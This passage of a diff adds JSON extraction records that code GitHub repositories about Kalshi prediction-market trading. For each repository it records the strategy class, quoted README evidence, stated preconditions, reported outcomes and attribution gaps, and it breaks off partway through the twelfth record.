@@ -1,0 +1,2612 @@
+[
+ {
+  "_host": "github",
+  "_key": "sudo-ai-git/kalshi-backtest",
+  "id": "ks-sc-001",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/sudo-ai-git/kalshi-backtest",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T4",
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K2",
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T4",
+    "quote": "Best candidate strategy (BUY_NO @ high-NO-prob) | +1.37% ROI, CI [1.13, 1.61], n=23",
+    "location": "README.md, section 'The headline finding (from ~92,000 real settled markets)', findings table"
+   },
+   {
+    "class": "T4",
+    "quote": "Favorites >> longshots (the classic\n   favorite-longshot bias), but that bias is already priced in and eaten by\n   fees/spread.",
+    "location": "README.md, section 'Three structural realities', item 3"
+   },
+   {
+    "class": "T8",
+    "quote": "Rigorous backtester and data-pullers for Kalshi (the US CFTC-regulated\nprediction-market exchange).",
+    "location": "README.md, opening paragraph"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; sections 'The headline finding' and 'Three structural realities'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "fee and spread erode the stated bias",
+    "quote": "that bias is already priced in and eaten by\n   fees/spread",
+    "location": "README.md 'Three structural realities' item 3"
+   },
+   {
+    "precondition": "instrument availability",
+    "quote": "**Kalshi's settlement feed is ~99.9% multivariate/combo markets** right\n   now.",
+    "location": "README.md 'Three structural realities' item 1"
+   },
+   {
+    "precondition": "correct baseline required",
+    "quote": "The correct null for\n   any strategy is the **always-NO baseline**, and every candidate must beat\n   it.",
+    "location": "README.md 'Three structural realities' item 2"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": true,
+   "verbatim": "Best candidate strategy (BUY_NO @ high-NO-prob) | +1.37% ROI, CI [1.13, 1.61], n=23",
+   "data_span": "~92,000 settled/closed Kalshi markets; NO-tilt measured across a 30k settled sample",
+   "cost_treatment": "README states fees/spread consume the bias; the ROI figure's own cost treatment is not stated in the README",
+   "uncertainty": "CI [1.13, 1.61], n=23, and the README states the candidate is 'statistically indistinguishable' from the always-NO baseline",
+   "attribution": "The source states this. The corpus states nothing itself and re-derives, re-scales and annualizes nothing."
+  },
+  "F11_attribution_status": "Rules stated are carried by an in-record derivation against a stated baseline and a stated data span; the 'favorite-longshot bias' label is used without a citation to its originating literature — attribution gap recorded, and the corpus may not restate that rule as established on this record's authority.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the NO-probability threshold defining 'high-NO-prob' (selection procedure: grid or cross-validated search over the threshold with a bootstrap CI on the resulting statistic)",
+   "the minimum n for a decision rule (selection procedure: minimum detectable effect size, never retrospective power)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository under an individual/organisation account; no external moderation or editorial criteria are stated. The README states its own methodological posture ('every \"edge\" has a confidence interval').",
+   "expertise": "Producer identity is a GitHub handle only; authority and knowledge cannot be determined from the record. Recorded as an attribute only — not used to stratify, band, or rank (section 7.1(b))."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "himagna16/kalshi-microstructure",
+  "id": "ks-sc-002",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/himagna16/kalshi-microstructure",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T6",
+   "T4",
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K2",
+   "K3",
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T6",
+    "quote": "Kalshi charges takers `0.07 × P × (1−P)` per contract per side. That fee is\nmaximized exactly where event trading is interesting — at uncertain prices —\nand it stacks on top of a spread that is also widest mid-range:",
+    "location": "README.md, section on cost to trade, ~line 84"
+   },
+   {
+    "class": "T4",
+    "quote": "**Classic favorite–longshot bias.** At close, contracts priced 10–15¢\n   realize YES only 4% of the time",
+    "location": "README.md, 'TL;DR' item 5"
+   },
+   {
+    "class": "T8",
+    "quote": "a collector on a $6/month DigitalOcean\ndroplet polled the Kalshi API roughly every 42 seconds (36,611 polling cycles,\nzero missed days) and recorded top-of-book quotes, sizes, and depth",
+    "location": "README.md, opening paragraph"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; 'TL;DR' items 1-5 and the cost-to-trade section",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi crypto event contracts (BTC, ETH, SOL, XRP, DOGE hourly and daily threshold markets)",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "taker fee formula and its interaction with spread",
+    "quote": "Kalshi charges takers `0.07 × P × (1−P)` per contract per side.",
+    "location": "README.md cost-to-trade section"
+   },
+   {
+    "precondition": "break-even move required for a taker round trip",
+    "quote": "A contract trading at 40–50¢ must move **10.7¢** (≈ 11 percentage points of\nimplied probability) before a taker round trip breaks even.",
+    "location": "README.md cost-to-trade section"
+   },
+   {
+    "precondition": "tradability of listed contracts",
+    "quote": "**Most listed contracts are never tradable.** 79% of the 54,380 contracts\n   observed never showed a two-sided book.",
+    "location": "README.md 'TL;DR' item 1"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": true,
+   "verbatim": "**Prices are extremely well calibrated.** Brier score 0.009 at close, 0.062\n   even 24h out (vs ~0.24 for guessing the base rate). The market knows.",
+   "data_span": "July 30 to August 17, 2026; 8.06M snapshots across 54,380 contracts; settlement outcome of 427,017 markets",
+   "cost_treatment": "Stated explicitly: spread plus the taker fee formula quoted above",
+   "uncertainty": "Brier scores reported as point values; no interval stated in the README",
+   "attribution": "The source states this. Nothing is re-derived, re-scaled, rounded, or annualized here."
+  },
+  "F11_attribution_status": "The fee formula is stated as the venue's, without a citation to the venue's own fee schedule inside the README (an S-D document would carry it); the 'favorite–longshot bias' label is used without citation to its originating literature. Both gaps recorded; the corpus may not restate either as established on this record's authority.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the price band at which a taker round trip is deemed viable (selection procedure: derive from the stated fee function and a measured spread distribution, not chosen by hand)",
+   "the polling interval for any replication of the capture (selection procedure: justified against the venue's stated rate limits and the autocorrelation of the quote process)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation or editorial criteria stated. Method, span, and instrument are stated in the record and charts are included.",
+   "expertise": "Producer identity is a GitHub handle only; authority and knowledge cannot be determined. Attribute only, not a stratifier."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "satchelscode/Kalshi-Market-Maker",
+  "id": "ks-sc-003",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/satchelscode/Kalshi-Market-Maker",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T5"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K3",
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T5",
+    "quote": "Automated market making bot for Kalshi prediction markets. Posts resting limit orders on both YES and NO sides of binary markets, collects the bid-ask spread when both sides fill, and manages inventory risk.",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T5",
+    "quote": "| Pricing | `pricing.py` | Fair value from orderbook midpoint, spread sizing |",
+    "location": "README.md, Architecture table"
+   },
+   {
+    "class": "T5",
+    "quote": "| Risk | `risk.py` | Position tracking, limits, inventory skew, kill switch |",
+    "location": "README.md, Architecture table"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraph and Architecture table",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "API key pair required",
+    "quote": "Generate an API key pair in your Kalshi dashboard",
+    "location": "README.md, Setup step 1"
+   },
+   {
+    "precondition": "authentication scheme",
+    "quote": "| API Client | `api_client.py` | RSA-PSS auth, rate limiting, REST methods |",
+    "location": "README.md, Architecture table"
+   },
+   {
+    "precondition": "market selection gate",
+    "quote": "| Scanner | `scanner.py` | Identifies viable markets by volume/spread/OI |",
+    "location": "README.md, Architecture table"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "The record states no realized or simulated outcome for the strategy."
+  },
+  "F11_attribution_status": "The quoting and inventory rules are stated with neither a citation nor an in-record derivation. Attribution gap recorded; the corpus may never restate this rule as established.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the quoted spread width (selection procedure: search over the width with the realized fill and adverse-selection cost as the objective, with a bootstrap CI)",
+   "the inventory skew coefficient",
+   "the volume/spread/open-interest cut defining a 'viable market' (selection procedure: empirical, not a hand-set constant)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated. Module-level architecture is documented.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "AjwaZainab/WTI_Kalshi_Backtest",
+  "id": "ks-sc-004",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/AjwaZainab/WTI_Kalshi_Backtest",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T4",
+   "T3",
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K2",
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T4",
+    "quote": "A backtesting tool for evaluating a **NO-side betting strategy** on Kalshi's WTI crude oil range markets. The strategy identifies range brackets that are far from the current WTI spot price and have a high implied NO probability, then tracks whether those bets would have resolved in your favor.",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T3",
+    "quote": "1. Reads the live WTI spot price",
+    "location": "README.md, 'How It Works' step 1 — the stated pairing against a settlement-source market"
+   },
+   {
+    "class": "T4",
+    "quote": "4. Among qualifying markets, picks the one whose **midpoint is furthest from the current WTI price**",
+    "location": "README.md, 'How It Works' step 4"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraph and 'How It Works' steps 1-5",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi WTI crude oil range markets",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "timing relative to market close",
+    "quote": "At **2:20 PM ET** (just before Kalshi's WTI markets close), the script:",
+    "location": "README.md, 'How It Works' preamble"
+   },
+   {
+    "precondition": "contract structure required",
+    "quote": "Looks at all active **\"between\" (range) markets** for that event",
+    "location": "README.md, 'How It Works' step 2"
+   },
+   {
+    "precondition": "external spot data required",
+    "quote": "\"wti_prices\": {...}      // ISO timestamp → WTI spot price",
+    "location": "README.md, backtest_cache.json schema"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": "not stated in the README",
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "The record describes what the tool records ('Records whether that bet resolved as NO (a win) or YES (a loss)') but states no realized or simulated result figure in the README."
+  },
+  "F11_attribution_status": "The rule is stated with neither a citation nor an in-record derivation. Attribution gap recorded; the corpus may never restate this rule as established.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the implied-NO-probability threshold, which the README labels a default of 97% — an unlabelled constant as stated (selection procedure: grid or Bayesian search with a bootstrap CI, not a default)",
+   "the distance-from-spot criterion",
+   "the evaluation cut-off time"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "VishalBalaji13/RL-Trader-for-Kalshi-Bitcoin-Hourly-Markets",
+  "id": "ks-sc-005",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/VishalBalaji13/RL-Trader-for-Kalshi-Bitcoin-Hourly-Markets",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T7"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T7",
+    "quote": "This project details the design, implementation, and deployment of a Deep Reinforcement Learning (DRL) agent capable of trading Bitcoin price threshold event contracts on the Kalshi prediction market.",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T7",
+    "quote": "The trading task is formulated as a Markov Decision Process (MDP) tuple $(S, A, R, \\gamma)$.",
+    "location": "README.md, 'Problem Formulation'"
+   },
+   {
+    "class": "T7",
+    "quote": "trains a policy using Proximal Policy Optimization (PPO), and deploys this policy in real-time to the Kalshi Demo environment",
+    "location": "README.md, opening paragraph"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; 'System Architecture' and 'Problem Formulation'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi Bitcoin hourly threshold markets, Kalshi Demo environment",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "state inputs required",
+    "quote": "**Market Data:** Normalized recent Bitcoin price history, current implied probability of the \"YES\" contract, and the strike price.",
+    "location": "README.md, 'State Space'"
+   },
+   {
+    "precondition": "time-to-expiry feature",
+    "quote": "**Time Features:** Time remaining until the contract expires.",
+    "location": "README.md, 'State Space'"
+   },
+   {
+    "precondition": "deployment environment",
+    "quote": "queued autonomously in the Kalshi Demo environment via the Kalshi v2 API",
+    "location": "README.md, figure caption"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": "not stated in the extracted README region",
+   "cost_treatment": "not stated in the extracted README region",
+   "uncertainty": null,
+   "attribution": "Deployment is stated to be the Demo environment; no live realized outcome is stated in the extracted region."
+  },
+  "F11_attribution_status": "PPO is named as a published method but carries no citation inside the README; the MDP formulation is derived in-record. Partial attribution gap recorded.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "PPO hyperparameters (clip range, discount factor, learning rate) — selection procedure: search with walk-forward validation, never in-sample tuning",
+   "the reward specification",
+   "the train/validation/test split boundaries, which for a time-series task must be time-ordered and disjoint"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated. Method is documented at formulation level with a figure of a live demo order.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "PCeltide/snapevent",
+  "id": "ks-sc-006",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/PCeltide/snapevent",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8",
+   "T6"
+  ],
+  "F3_contribution_codes": [
+   "K3",
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "Capture and storage tooling for Kalshi market data — live **L2 order books** over\nWebSocket and historical **trade tape** over REST",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T8",
+    "quote": "**This repo only captures and stores data. There is no trading logic, ever.** It\nis the data foundation for order-flow research.",
+    "location": "README.md, second paragraph"
+   },
+   {
+    "class": "T6",
+    "quote": "L2 order-book history exists **only** on the live\n> feed (Kalshi sells no historical L2), so capture uptime + gap detection are\n> first-class concerns (ADR-003).",
+    "location": "README.md, 'Status' block"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraphs and 'Status' block",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "historical L2 data is not purchasable and must be captured live",
+    "quote": "L2 order-book history exists **only** on the live\n> feed (Kalshi sells no historical L2)",
+    "location": "README.md, 'Status' block"
+   },
+   {
+    "precondition": "interface split between live and historical",
+    "quote": "live **L2 order books** over\nWebSocket and historical **trade tape** over REST",
+    "location": "README.md, opening paragraph"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "The record states no strategy outcome and explicitly disclaims trading logic."
+  },
+  "F11_attribution_status": "The record states an executability precondition (K3) rather than a trading rule, so REVIEW.md directive 8's rule-attribution obligation is not engaged. The precondition itself is asserted without a citation to the venue's own S-D documentation.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "capture cadence and universe breadth (selection procedure: justified against the venue's stated rate limits and the research question's resolution requirement)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; CI badge present and the record states a passing test count. No external editorial criteria stated.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "kapelame/kalshi-crypto-bot",
+  "id": "ks-sc-007",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/kapelame/kalshi-crypto-bot",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8",
+   "T6"
+  ],
+  "F3_contribution_codes": [
+   "K3",
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "An end-to-end framework for trading on [Kalshi](https://kalshi.com) — the first regulated US event contract exchange. Covers data collection, ML training, backtesting, paper trading, live execution, and real-time monitoring.",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T8",
+    "quote": "**Strategy logic is intentionally left empty** — bring your own signals.",
+    "location": "README.md, second paragraph"
+   },
+   {
+    "class": "T6",
+    "quote": "Settlement: if CF Benchmarks 60s average at close >= 60s average at open → YES wins",
+    "location": "README.md, 'How It Works'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraphs and 'How It Works'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi crypto 15-minute markets (BTC, ETH, SOL, XRP)",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "settlement source and resolution rule",
+    "quote": "Settlement: if CF Benchmarks 60s average at close >= 60s average at open → YES wins",
+    "location": "README.md, 'How It Works'"
+   },
+   {
+    "precondition": "price-to-probability convention",
+    "quote": "Prices in cents: `yes_bid=24` means 24% implied probability",
+    "location": "README.md, 'How It Works'"
+   },
+   {
+    "precondition": "contract cadence and strike reference",
+    "quote": "New market opens every 15 minutes with a fresh `floor_strike` reference price",
+    "location": "README.md, 'How It Works'"
+   },
+   {
+    "precondition": "data collection needs no credentials",
+    "quote": "### 2. Collect data (no API key needed)",
+    "location": "README.md, 'Quick Start'"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "The record states the framework 'handles ... fee calculation'; no fee figure is stated.",
+   "uncertainty": null,
+   "attribution": "The record explicitly states it contains no strategy, so it reports no strategy outcome."
+  },
+  "F11_attribution_status": "No trading rule is stated, so directive 8's obligation is not engaged. The settlement mechanic is asserted without citation to the venue's own contract specification (an S-D document).",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "every signal parameter, since the record states the strategy layer is deliberately empty",
+   "the polling cadence (the record states 2s over 4 hours as its own collector setting; any adoption requires justification against stated rate limits)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated. Settlement mechanics and price convention are documented explicitly.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "dino-markets/dino-markets-typescript",
+  "id": "ks-sc-008",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/dino-markets/dino-markets-typescript",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T2",
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T2",
+    "quote": "Official TypeScript SDK for [dino.markets](https://dino.markets): related Kalshi and Polymarket prediction markets across sports, crypto, weather, and economics, plus confirmed cross-venue arbitrage and a real-time stream.",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T8",
+    "quote": "Zero runtime dependencies. Built on the native `fetch` API, so it runs in Node 18+, Deno, Bun, and the browser without a bundler polyfill.",
+    "location": "README.md, second paragraph"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraphs",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi and Polymarket (as stated); the SDK's own vendor venue is dino.markets",
+  "F8_kalshi_specific": "transferred-with-stated-assumption",
+  "F8_carrying_assumption": "The record states the pairing is between Kalshi and Polymarket markets that the vendor has 'related'; the correspondence rule that makes two venue listings the same event is the vendor's and is not stated in the record.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "vendor API key required",
+    "quote": "Get a free API key from the dashboard at https://dino.markets.",
+    "location": "README.md, 'Auth'"
+   },
+   {
+    "precondition": "third-party dependency for the venue relation",
+    "quote": "related Kalshi and Polymarket prediction markets",
+    "location": "README.md, opening paragraph"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "The record asserts 'confirmed cross-venue arbitrage' as a data product but states no measured outcome, no span, and no cost treatment."
+  },
+  "F11_attribution_status": "The phrase 'confirmed cross-venue arbitrage' is an unattributed claim: neither a citation nor an in-record derivation of what 'confirmed' means. Gap recorded; the corpus may never restate it as established.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the event-correspondence rule that maps a Kalshi contract to a Polymarket contract (selection procedure: an explicit, auditable matching rule with a measured false-match rate, not a vendor black box)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Vendor-published SDK for the vendor's own paid data product; no external moderation stated. Production is under an organisation account.",
+   "expertise": "Vendor identity is stated (dino.markets); the producers' individual authority cannot be determined. Attribute only, not a stratifier."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "carllman13/Kalshi_Trading",
+  "id": "ks-sc-009",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/carllman13/Kalshi_Trading",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T3",
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T3",
+    "quote": "Today, I can use prices of different Fed-Rate related contracts on Kalshi to calculated implied Fed Funds rate for different meetings.",
+    "location": "README.md, 'FedCurve' section"
+   },
+   {
+    "class": "T3",
+    "quote": "A package for analyzing implied Fed Funds Rates Curve over time.",
+    "location": "README.md, 'FedCurve' section"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; 'FedCurve' section",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi Fed-Rate contracts",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "multiple meeting-dated contracts must be listed simultaneously",
+    "quote": "For example, if I have rates for 23FEB, 23MAR,23MAY (3 meetings), I can plot this and this becomes a curve.",
+    "location": "README.md, 'FedCurve' section"
+   },
+   {
+    "precondition": "credentials",
+    "quote": "User is for setting username/pw/other default parameters.",
+    "location": "README.md, 'Instructions'"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "The record states a construction (an implied-rate curve) and no strategy outcome."
+  },
+  "F11_attribution_status": "The price-to-implied-rate construction is stated without a citation and without an in-record derivation of the mapping. Gap recorded.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the price-to-implied-rate mapping and its treatment of the contract's discrete strike ladder (selection procedure: derived, with the derivation stated)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated. A video walkthrough is linked.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "dagemawigetachew-arch/Kalshi_Project",
+  "id": "ks-sc-010",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/dagemawigetachew-arch/Kalshi_Project",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T4"
+  ],
+  "F3_contribution_codes": [
+   "K1"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T4",
+    "quote": "Quantitative analysis and backtesting of NBA prediction markets to investigate market overreaction, mean reversion, and game-state-driven trading opportunities.",
+    "location": "README.md, sole content line"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit (178 bytes; the quoted line is the entire substantive content)",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "NBA prediction markets; the record names no specific venue beyond the repository name 'Kalshi_Project'",
+  "F8_kalshi_specific": "transferred-with-stated-assumption",
+  "F8_carrying_assumption": "The README names no venue. Only the repository name names Kalshi. The venue of establishment is therefore not stated in the record's own prose and is not inferred here.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated",
+    "quote": null,
+    "location": "README.md states no fee, tick, collateral, limit, settlement, latency, or data-availability precondition"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "'Market overreaction' and 'mean reversion' are named as objects of investigation with neither citation nor in-record derivation. Gap recorded; the corpus may never restate either as established on this record.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "every parameter: the record states a research intent and no rule"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated; documentation is one sentence.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "Waike122333/Automated-Trading-Kalshi",
+  "id": "ks-sc-011",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/Waike122333/Automated-Trading-Kalshi",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T7"
+  ],
+  "F3_contribution_codes": [
+   "K1"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T7",
+    "quote": "An algorithmic trading bot for [Kalshi](https://kalshi.com/) event contracts that automates trading strategies based on economic data, news events, weather patterns, and political markets in real-time.",
+    "location": "README.md, sole content line"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit (229 bytes; the quoted line is the entire substantive content)",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated",
+    "quote": null,
+    "location": "README.md states no fee, tick, collateral, limit, settlement, latency, or data-availability precondition"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "The information-driven strategy class is named with neither citation nor in-record derivation. Gap recorded.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "every parameter: the record names input classes and no rule mapping them to an action"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated; documentation is one sentence.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "EliasLittle/KalshiTradingSystem",
+  "id": "ks-sc-012",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/EliasLittle/KalshiTradingSystem",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "`MarketDataService` \n    - Listens for market data events from Kalshi and pushes them to Kafka",
+    "location": "README.md, 'Using the system'"
+   },
+   {
+    "class": "T8",
+    "quote": "Strategies are effectively event listeners that listen for market data events and do something with them, whether that's logging, sending orders, notifying a user, etc.",
+    "location": "README.md, 'Using the system', User Strategies"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; 'Using the system'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Kalshi (prod and demo environments)",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "external infrastructure required",
+    "quote": "Running Kafka server",
+    "location": "README.md, 'Requirements'"
+   },
+   {
+    "precondition": "credential form",
+    "quote": "KALSHI_PROD_EMAIL",
+    "location": "README.md, 'Using the system' — the record states an email/password credential model"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated; the record describes a strategy-hosting framework, not a strategy."
+  },
+  "F11_attribution_status": "No trading rule is stated, so directive 8's obligation is not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "every strategy parameter: the record supplies only an event-listener scaffold and a test strategy"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated.",
